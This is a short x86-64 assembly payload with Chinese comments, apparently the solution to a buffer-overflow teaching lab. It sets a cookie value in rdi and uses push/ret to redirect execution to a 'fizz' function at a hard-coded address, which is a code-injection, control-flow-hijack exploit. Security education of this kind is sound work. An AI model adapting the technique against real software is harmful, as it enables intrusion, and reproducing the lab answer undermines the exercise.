section .text
global _start

_start:
    ; 将cookie值(0xc109a39)移动到rdi寄存器
    mov rdi, 0xc109a39
    
    ; 将fizz函数地址(0x4012fc)压入栈
    mov rax, 0x4012fc
    push rax
    
    ; 返回，跳转到fizz函数
    ret